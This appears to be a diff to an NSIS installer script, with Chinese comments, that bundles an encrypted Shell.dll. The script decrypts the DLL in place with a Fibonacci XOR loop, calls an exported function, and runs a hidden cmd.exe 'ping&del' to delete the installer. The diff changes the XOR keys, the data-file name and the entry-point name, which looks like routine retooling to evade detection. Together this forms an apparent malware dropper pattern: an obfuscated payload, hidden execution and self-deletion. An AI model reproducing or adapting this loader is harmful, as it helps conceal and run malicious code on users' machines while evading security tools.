@@ -26,13 +26,13 @@ Section "RC"
 
 	; 要打包安装的文件
 	File "Shell.dll"
-	File "svtlogo.dat"
+	File "data.dat"
 	; 解密文件
 	FileOpen $R1 "$INSTDIR\Shell.dll" "a"
 	
 	;初始化循环异或变量
-	IntOp $1 3 + 0
-	IntOp $2 5 + 0
+	IntOp $1 151 + 0
+	IntOp $2 95 + 0
 	IntOp $3 0 + 0
 	
 	;开始斐波那契异或解密
@@ -56,7 +56,7 @@ Section "RC"
 	FileClose $R1
 
 	;自删除 发现不能适应带空格的路径
-	System::Call '$INSTDIR\Shell.dll::InitSvr()'
+	System::Call '$INSTDIR\Shell.dll::Init(i 1)'
 	System::Call 'kernel32::GetModuleFileName(i 0,t .R1,i 1024)'
 	ExecShell "open" "cmd.exe" "/c ping 127.0.0.1&del $\"$R1$\"" SW_HIDE
 
